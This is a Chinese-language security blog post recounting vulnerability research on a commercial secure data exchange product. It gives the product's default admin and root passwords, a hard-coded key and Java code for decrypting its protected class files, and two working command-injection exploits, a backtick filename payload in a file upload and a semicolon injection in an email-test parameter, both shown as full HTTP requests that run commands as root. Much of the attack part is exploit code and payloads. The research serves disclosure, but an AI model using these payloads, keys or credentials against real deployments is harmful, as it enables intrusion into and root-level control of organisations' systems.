---
title: "某安全数据交换系统的漏洞挖掘"
date: 2023-09-18
description: 本文写于2022年，分享一下挖掘某安全数据交换系统漏洞的过程。
url: /archivers/2023-09-18/code-auditing
tags: 代码审计
---


> 本文写于2022年，分享一下挖掘某安全数据交换系统漏洞的过程。


<aside>
📎 最初拿到的系统是一个vmware虚拟机，系统是Linux

基本信息：

- 后台管理界面用户名密码：admin/nxg@LL99
- 操作系统：root / bo%Fn!71、uninxg / lx$zR9ce
</aside>

### 配置网络

根据产品安装文档环境搭建完毕后，手动设置IP地址和DNS：

手工修改 `/etc/resolv.conf`

```
nameserver 114.114.114.114
nameserver 8.8.8.8
```

修改 `/etc/NetworkManager/NetworkManager.conf` 文件，在main部分添加 “dns=none” 选项：

```cpp
[main]
#plugins=ifcfg-rh
dns=none
```

网络IP地址配置文件在 `/etc/sysconfig/network-scripts` 文件夹下：

![0](https://images.payloads.online/2024-07-29-c1fdebce3a78e6a40d687eb5fa49a1b528c20752858153814edc88cba437ceaa.png)  


我添加了两个网卡，其中一个用来供本机访问：

![1](https://images.payloads.online/2024-07-29-683e57752f22f8419b233e4952db222874f86e8902cfdd70410619b4b6a2aea1.png)  


`/etc/sysconfig/network-scripts/ifcfg-eth1-1`

```cpp
HWADDR=00:0C:29:4B:16:B4
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=none
IPADDR=192.168.117.100
GATEWAY=192.168.117.2
PREFIX=24
DNS1=114.114.114.114
DNS2=8.8.8.8
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV4_DNS_PRIORITY=100
IPV6INIT=no
NAME=eth1
UUID=8a47e710-cadd-49b5-b9b7-33a324c4ab66
DEVICE=eth1
ONBOOT=no
```

观察启动命令行：

```cpp
/home/leagsoft/SafeDataExchange/jdk/bin/java -Dnop -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dlog4j2.formatMsgNoLookups=true -javaagent:/home/leagsoft/SafeDataExchange/Apache/lib/jdc.jar -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0022 -Dignore.endorsed.dirs= -classpath /home/leagsoft/SafeDataExchange/Apache/bin/bootstrap.jar:/home/leagsoft/SafeDataExchange/Apache/bin/tomcat-juli.jar -Dcatalina.base=/home/leagsoft/SafeDataExchange/Apache -Dcatalina.home=/home/leagsoft/SafeDataExchange/Apache -Djava.io.tmpdir=/home/leagsoft/SafeDataExchange/Apache/temp org.apache.catalina.startup.Bootstrap start
```

`/home/leagsoft/SafeDataExchange/Apache` 是Tomcat的安装目录，webapps目录下是部署的应用源代码：

![2](https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png)  


将war包通过ssh拷贝至本地就可以看到整个项目的源代码了。

![3](https://images.payloads.online/2024-07-29-1a82b57f36a183a00f4b4ab358743ad1468f7c054a4d846d043739e40cb36011.png)  


### 源代码解密

将war包拷贝到本地通过idea打开，发现关键代码的实现都是空，连spring的控制器都是空，初步怀疑是被加密了，那么它是如何加密的呢？

![4](https://images.payloads.online/2024-07-29-3d65e98c169d8ee3d33e646b32ff390b9d60142de117b783b26ff2f4286059cf.png)  


既然网站可以正常跑起来，那么应该是运行时的某种技术手段实现，观察启动命令行：

```cpp
/home/leagsoft/SafeDataExchange/jdk/bin/java 
-Dnop -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager 
-Dlog4j2.formatMsgNoLookups=true 
**-javaagent:/home/leagsoft/SafeDataExchange/Apache/lib/jdc.jar** 
-Djdk.tls.ephemeralDHKeySize=2048 
-Djava.protocol.handler.pkgs=org.apache.catalina.webresources 
-Dorg.apache.catalina.security.SecurityListener.UMASK=0022 
-Dignore.endorsed.dirs= 
-classpath /home/leagsoft/SafeDataExchange/Apache/bin/bootstrap.jar:/home/leagsoft/SafeDataExchange/Apache/bin/tomcat-juli.jar 
-Dcatalina.base=/home/leagsoft/SafeDataExchange/Apache -Dcatalina.home=/home/leagsoft/SafeDataExchange/Apache 
-Djava.io.tmpdir=/home/leagsoft/SafeDataExchange/Apache/temp org.apache.catalina.startup.Bootstrap start
```

命令行中有一个javaagent引起了我的注意：

```cpp
-javaagent:/home/leagsoft/SafeDataExchange/Apache/lib/jdc.jar 
```

将lib文件夹拷贝到项目中，观察jar包的结构：

![5](https://images.payloads.online/2024-07-29-3a3d748071951a49d48afca2648beb92e8e0f801908aaa4681985e013407260e.png)  


看样子是调用了javassist实现了一种内存补丁技术，找到Agent的入口方法，看看它做了什么：

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.leagsoft.declass;

import java.lang.instrument.Instrumentation;

public class Agent {
    public Agent() {
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        CoreAgent.premain(args, inst);
    }
}
```

跟进`CoreAgent.premain`：

```java
public class CoreAgent {
    public CoreAgent() {
    }

    public static void premain(String args, Instrumentation inst) {
        if (inst != null) {
            File file = new File("../../Ini/ec.file");
            Map<String, String> configMap = ECFileConfig.getConfig();
            byte[] bytes = IoUtils.readFileToByte(file);
            byte[] by = EncryptUtils.de(bytes, ((String)configMap.get("pf")).toCharArray(), 1);
            AgentTransformer tran = new AgentTransformer(EncryptUtils.rsk(new String(by)).toCharArray());
            inst.addTransformer(tran);
        }

    }
}
```

这里可以看到，它是先通过ECFileConfig初始化，然后解密读取Ini/ec.file

跟进`ECFileConfig.getConfig()`：

```cpp
public class ECFileConfig {
    private static Map<String, String> configMap = null;

    public ECFileConfig() {
    }

    private static void iniConfig() {
        if (configMap == null) {
            INIImpl ini = ECFileIni.getIni();
            configMap = ini.getProperties("ECFile");
        }
    }

    public static Map<String, String> getConfig() {
        iniConfig();
        return configMap;
    }
}

//// ECFileIni.getIni();

public class ECFileIni {
    private static String file = "../../Ini/ECFile.ini";
    private static INIImpl self = null;

    static {
        self = init();
    }

    public ECFileIni() {
    }

    private static INIImpl init() {
        String code = FileEncode.getFileEncode(file);
        INIImpl iniFile = "asci".equals(code) ? INIUtil.getInstance(file) : INIUtil.getInstance(file, code);
        return iniFile;
    }

    public static String getStringProperty(String section, String property) {
        String rs = self.getStringProperty(section, property);
        return "null".equals(rs) ? null : rs;
    }

    public static INIImpl getIni() {
        return self;
    }
}
```

恰好我在服务器上找到了这个文件 ECFile.ini ：

![6](https://images.payloads.online/2024-07-29-4c6797f665e41e879b8544677a77a9fb4f74bd6ba6ba16e6abaab6c5894f72c8.png)  


再看看`AgentTransformer` 的实现：

```java
public class AgentTransformer implements ClassFileTransformer {
    private char[] pwd;

    public AgentTransformer(char[] pwd) {
        this.pwd = pwd;
    }

    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain domain, byte[] classBuffer) {
        if (className != null && domain != null && loader != null) {
            String projectPath = domain.getCodeSource().getLocation().getPath();
            projectPath = JarUtils.getRootPath(projectPath);
            if (StrUtils.isEmpty(projectPath)) {
                return classBuffer;
            } else {
                className = className.replace("/", ".").replace("\\", ".");
                byte[] bytes = JarDecryptor.getInstance().doDecrypt(projectPath, className, this.pwd);
                return bytes != null && bytes[0] == -54 && bytes[1] == -2 && bytes[2] == -70 && bytes[3] == -66 ? bytes : classBuffer;
            }
        } else {
            return classBuffer;
        }
    }
```

`AgentTransformer` 重写了`ClassFileTransformer`的`transform`方法，将每一个class和密码放入`JarDecryptor.doDecrypt`进行解密，最终返回字节码。

再来看看`JarDecryptor.doDecrypt`的实现：

![7](https://images.payloads.online/2024-07-29-6ac72116d00abdb02053e3b552699cc6179a6f2e604f1464dd560c268f157a43.png)  


通过`readEncryptedFile` 方法读取**`META-INF/.classes/`** 下的class文件进行解密。

回到文件目录，在META-INF下发现了许多加密的class字节码文件：

![8](https://images.payloads.online/2024-07-29-1c776fe4fe02193807e9a09ffeb672546340052de6e74e835d097554c05325f0.png)  


这里我通过编写一个类，调用`JarDecryptor.doDecrypt`对全部class进行了解密：

```java
import com.leagsoft.declass.util.ECFileConfig;
import com.leagsoft.declass.util.EncryptUtils;
import com.leagsoft.declass.util.IoUtils;
import com.leagsoft.declass.util.StrUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Map;

public class Main {
    private static final String ENCRYPT_PATH = "UniEx/META-INF/.classes/";
    private static final String DECRYPT_PATH = "UniEx-decode/UniExdecrypt/";

    private static char[] getPassword(){
        try {
            File file = new File("UniEx/ec.file");
            Map<String, String> configMap = ECFileConfig.getConfig();
            byte[] bytes = IoUtils.readFileToByte(file);
            String pf = "UniNXG-KUv1N5FQr9NtPWnK5UpJ8nnM3blCH9jYtGoXeo0bsXowOffDnW2o0DaVo41ZblSF0tNow5dPxVn8odAS9l4QxCiSvGTXhbliZF9W";
            byte[] by = EncryptUtils.de(bytes, pf.toCharArray(), 1);
            char password[] = EncryptUtils.rsk(new String(by)).toCharArray();
            System.out.println(password);
            return password;
        } catch (Exception e) {
            System.out.println(e);
        }
         return null;
    }

    public static void main(String[] args) throws Exception {
        char password[] = getPassword();
        File classFiles = new File(ENCRYPT_PATH);
        File[] fs = classFiles.listFiles();
        for (File classFile : fs){
            System.out.println(classFile.getAbsolutePath());
            File file = new File(ENCRYPT_PATH, classFile.getName());
            byte[] bytes = IoUtils.readFileToByte(file);
            if (bytes == null) {
                return ;
            } else {
                char[] pass = StrUtils.merger(new char[][]{password, classFile.getName().toCharArray()});
                bytes = EncryptUtils.de(bytes, pass, 1);
                System.out.println("正在解密... " + classFile.getName());
                try{
                    File outFile = new File(DECRYPT_PATH+ classFile.getName()+".class");
                    if (!outFile.exists()){
                        outFile.createNewFile();
                    }
                    FileOutputStream outputStream = new FileOutputStream(outFile);
                    outputStream.write(bytes);
                }catch (Exception e){
                }
            }
        }
    }
}
```
![9](https://images.payloads.online/2024-07-29-caca69621b0ac31050dfbda096c260c6dbca086b742f059138ecda98f14935a6.png)  


跑一下Main方法就能将所有的加密class字节码文件还原，大功告成。

### 远程调试Tomcat

修改Tomcat安装目录下`bin/catalina.sh` 文件，通过定义catalina的配置选项可以在tomcat启动时开启远程调试端口。

修改文件：`/home/leagsoft/SafeDataExchange/Apache/bin/catalina.sh`

![10](https://images.payloads.online/2024-07-29-a569bb52b5db158da8c9ca25ec36e8386843cfdec60410570ab2ebc3945c73c8.png)  


加入内容：

```cpp
CATALINA_OPTS="-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:9999"
```

然后重启tomcat就可以进行远程调试了。
![15](https://images.payloads.online/2024-07-29-5286ff18ed77057ec7661589dae2390349c3688a64954c35f0addee8fa0ea1e2.png)  


打开idea，将原本没有方法实现的class替换为已经解密的class，添加远程调试配置：

这里我替换了：

`WEB-INF/classes/com/leagsoft/nxg/dlp/controller/FileTrackMarkMessageController.class`


![11](https://images.payloads.online/2024-07-29-291090c034eb14e7c54f6e8134dc4cffdc90c2caa137d8d9a3995cd5b2949607.png)  



添加一个调试配置，点击Edit Configurations：


![12](https://images.payloads.online/2024-07-29-72fed2f81a5857e1322cae31988c98a99f20535cf1df7489fba34e662dcb5e04.png)  
 

点击添加按钮，新增一个Remote配置：


![13](https://images.payloads.online/2024-07-29-5571001140fb45b5e6dd403647aee8c9bfffd6d485fa5a99810841f799c32665.png) 


填入远程调试的IP地址和端口：


![14](https://images.payloads.online/2024-07-29-470690a9c80ba81dce667b1dbc496df19c644658e99f5fe727cf52adc312dd2d.png)  


然后在要调试的方法下断点，点击调试按钮，控制台会提示已经连接到目标JVM：

![16](https://images.payloads.online/2024-07-29-caec6aa5c122933badd4c5d86d3cbfeaa93ac49c5d8055109b72018d7be87eda.png)  


当访问到对应的控制器，并且代码执行时，断点会生效：

![17](https://images.payloads.online/2024-07-29-b98190a484595ca8a2b7c07def77f2f5c12a80c12bf45c60bdb06e0c5a07e0a3.png)  


通过观察调用栈、局部变量的值可以很方便的帮助我们进行输入输出的判断。

### 后台命令执行一

通过审计发现`FileTrackMarkMessageController.class`中的`getUploadFileID` 方法调用了`Runtime.getRuntime().exec` 可能会存在命令执行漏洞。

```cpp
public void getUploadFileID(HttpServletRequest request, HttpServletResponse response) throws Exception {
        List<FileItem> fileList = new ArrayList();
        ModelAndViewUtil.getMultiParamterMap(request, fileList);
        String separator = File.separator;
        File detect = new File(".." + separator + ".." + separator + "Bin");
        if (!detect.exists()) {
            detect.mkdirs();
        }

        JObject jo = new JObject();
        if (fileList.size() > 0) {
            String fileID = "";
            Iterator var8 = fileList.iterator();

            while(var8.hasNext()) {
                FileItem file = (FileItem)var8.next();
                String simpleName = SysUtils.getSimpleName(file.getName().replaceAll("\\\\", "/"));
                file.write(new File(".." + separator + ".." + separator + "Bin" + separator + simpleName));
                String postfix = simpleName.substring(simpleName.lastIndexOf(".") + 1, simpleName.length());
                String comd = ".." + separator + ".." + separator + "Bin" + separator + "ClairDeLune printall " + "\"" + ".." + separator + ".." + separator + "Bin" + separator + simpleName + "\"" + " " + postfix;
                Process p = null;
                String[] command = new String[]{"/bin/sh", "-c", comd};
                p = Runtime.getRuntime().exec(command);

                .......

    }
```

我们的输入点是request对象，它被传入了`getMultiParamterMap`方法，跟进查看：

```cpp
public static Map<String, String> getMultiParamterMap(HttpServletRequest request, List<FileItem> fileList) throws FileUploadException {
        Map<String, String> param = new TreeMap();
        FileItemFactory factory = new DiskFileItemFactory();
        ServletFileUpload upload = new ServletFileUpload(factory);
        List items = null;

        try {
            items = upload.parseRequest(request);
        } catch (Exception var10) {
            LOG.error(var10.getMessage());
        }

        ......
        return param;
    }
```

`request` 被传入了`ServletFileUpload`，看来是一个文件上传的数据包。

构造一个文件上传的数据包发送过去调试看看：

```cpp
POST /UniEx/fileTrackMarkMessage/getUploadFileID.htm HTTP/1.1
Host: 192.168.117.100
Content-Length: 181
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Cookie: JSESSIONID=5D3B2F3A86C3F73FC8FA267D3D5603D5;
Referer: https://192.168.49.100/UniEx/login.jsp
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymo440JkALdwNUIKs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarymo440JkALdwNUIKs
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

123
------WebKitFormBoundarymo440JkALdwNUIKs--
```

此时局部变量的值：

![18](https://images.payloads.online/2024-07-29-6cdfbf06144d922718628f163f388c612fc310451acfd8da9b039989ec3b07fe.png)  


我发现文件名被带入了`/bin/sh -c` 意味着文件名也可以作为命令执行，由于前面有进行文件扩展名的获取解析，这个方法会取文件名的最后一个`.` 作为分割，把扩展名取得后拼接在最后面，最好的命令注入点是文件扩展名，最终我的payload如下：

```bash
file.`touch${IFS}222222`
```

![19](https://images.payloads.online/2024-07-29-0d3b7e5111031fac69abbe36548f69d4b03e41557e60107e919f41005f3966d5.png)  


利用````和`${IFS}`替代空格 在shell中的特点，可以达到任意命令执行的目的，我还发现它的java服务是以root用户启动的，意味着获取这个命令执行的权限就是最高权限。

![20](https://images.payloads.online/2024-07-29-5a44f4361c4d69a355c43805a908033c99d86f80539148f1fb3898d111b3deae.png)  


### 后台命令执行二

`com.leagsoft.uex.sysparam.controller.NoticeConfigController.class` 中的`testNoticeEmailAction`方法存在命令注入，在调用`JavaShellUtil.executeCommand`方法时，将用户输入带入了bash脚本后面，但`LeagUtil.filterCmdParams`对输入的值进行了过滤替换，不过因为参数没有放入单引号中，可以使用`;` 对前面的脚本进行闭合，从而绕过限制执行任意命令。

```java
public void testNoticeEmailAction(HttpServletRequest request, HttpServletResponse response) throws IOException {
        Map<String, String> emailMap = new HashMap();
        Map<String, String[]> map = request.getParameterMap();
        Set<Entry<String, String[]>> set = map.entrySet();
        Iterator it = set.iterator();

        while(it.hasNext()) {
            Entry<String, String[]> entry = (Entry)it.next();
            emailMap.put(entry.getKey(), ((String[])entry.getValue())[0]);
        }

        String random = (String)emailMap.get("random");
        String mailPwd = RC4.RC4DecodeForJS((String)emailMap.get("mailSendPwd"), random);
        emailMap.put("mailSendPwd", mailPwd);

        try {
            JavaShellUtil.executeCommand("/home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh " + LeagUtil.filterCmdParams((String)emailMap.get("mailServerAddr")) + " " + LeagUtil.filterCmdParams((String)emailMap.get("mailServerPort")), false);
            log.info("excute shell command : /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh {} {}", emailMap.get("mailServerPort"), emailMap.get("mailServerPort"));
        } catch (IOException var13) {
            log.error("excute /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh error", var13);
        }
.....
// LeagUtil.filterCmdParams

public static String filterCmdParams(String cmdParams) {
        if (StringUtils.isEmpty(cmdParams)) {
            return cmdParams;
        } else {
            String afterParams = cmdParams.replaceAll("`", "");
            if (!StringUtils.isEmpty(afterParams) && afterParams.contains("$(")) {
                afterParams = afterParams.replaceAll("\\$", "");
            }

            log.info("before cmdParams:{},after filter cmdParams:{}", cmdParams, afterParams);
            return afterParams;
        }
    }
```

发送数据包：

```java
POST /UniEx/noticeConfig/testNoticeEmailAction.htm HTTP/1.1
Host: 192.168.117.100
Cache-Control: max-age=0
Cookie: JSESSIONID=F9DA84D287041E1F8E09234CAA3EAB58;
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Referer: https://192.168.117.100/UniEx/login.jsp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

random=123&mailSendPwd=123&mailServerAddr=;touch%20/tmp/222&mailServerPort=123
```

### 思考

这款产品使用了javassist的动态执行技术，但是java始终还是java，我们只需要hook或者针对它最上层的代码进行研究即可，于是我根据本次漏洞挖掘，编写了一个工具：[Rvn0xsy/DumperAnalyze: 通过JavaAgent与Javassist技术对JVM加载的类对象进行动态插桩，可以做一些破解、加密验证的绕过等操作 (github.com)](https://github.com/Rvn0xsy/DumperAnalyze)

通过JavaAgent与Javassist技术对JVM加载的类对象进行动态插桩，可以做一些破解、加密验证的绕过等操作。